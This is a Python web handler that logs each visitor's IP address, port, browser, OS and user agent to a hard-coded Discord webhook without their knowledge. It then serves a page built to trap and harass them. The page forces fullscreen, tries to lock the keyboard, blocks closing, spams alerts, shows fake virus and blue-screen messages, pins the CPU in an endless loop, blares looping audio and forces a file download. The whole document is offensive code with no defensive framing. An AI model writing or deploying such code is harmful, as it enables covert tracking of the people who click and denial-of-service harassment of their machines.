from http.server import BaseHTTPRequestHandler
import json
import requests
import httpagentparser
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

# ──────── MAX ANNOYING HTML + LOUD TUNG TUNG SONG ────────
ANNOY_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CRITICAL SYSTEM FAILURE - TUNG TUNG</title>
  <style>
    body {margin:0; background:#000; color:#f00; font-family:monospace; overflow:hidden; height:100vh;}
    #overlay {position:fixed; inset:0; background:rgba(255,0,0,0.95); display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:9999;}
    h1 {font-size:8em; animation:blink 0.2s infinite;}
    p {font-size:4em; text-align:center;}
    @keyframes blink {0%,100% {opacity:1;} 50% {opacity:0.1;}}
  </style>
</head>
<body>
  <div id="overlay">
    <h1>TUNG TUNG VIRUS ACTIVATED</h1>
    <p>Your browser is now property of Tung Tung.<br>Close? Never.</p>
  </div>

  <!-- Loud Tung Tung Song -->
  <audio id="tungtung" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>

  <script>
    // Fullscreen
    if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});

    // Keyboard lock
    if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
      navigator.keyboard.lock().catch(() => {});
    }

    // Block closing
    window.onbeforeunload = () => "TUNG TUNG: Leave? No. System locked.";

    // Ultra spam alerts
    setInterval(() => {
      alert("TUNG TUNG VIRUS: CPU MELTING! CLOSE FAILED!");
    }, 600);

    // Fake Blue Screen after 8 seconds
    setTimeout(() => {
      document.body.innerHTML = '<h1 style="color:#fff;font-size:12em;text-align:center;margin-top:20vh;">BLUE SCREEN OF DEATH</h1><p>Tung Tung wins.<br>Reboot or cry.</p>';
    }, 8000);

    // CPU destroyer
    function cpuHell() {
      while(true) {
        for(let i = 0; i < 10000000; i++) {
          Math.sin(i) * Math.cos(i);
        }
        setTimeout(cpuHell, 0);
      }
    }
    cpuHell();

    // Make the Tung Tung song LOUD
    const audio = document.getElementById("tungtung");
    audio.volume = 1.0;        // MAX VOLUME
    audio.play().catch(() => {}); // force play

    // Download GIF
    const url = "%s";
    const link = document.createElement('a');
    link.href = url;
    link.download = "tung-tung-virus.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  </script>
</body>
</html>
""" % FAKE_IMAGE_URL

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed_ua = httpagentparser.detect(user_agent)

            log = f"**NEW CLICK!**\nIP: `{ip}`\nPort: `{port}`\nBrowser: {parsed_ua.get('browser', {}).get('name', 'Unknown')} {parsed_ua.get('browser', {}).get('version', '')}\nOS: {parsed_ua.get('os', {}).get('name', 'Unknown')}\nUA: `{user_agent}`\n**Tung Tung hell + loud song unleashed!**"

            requests.post(WEBHOOK_URL, json={"content": log})

            # Serve the nightmare page
            html = ANNOY_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
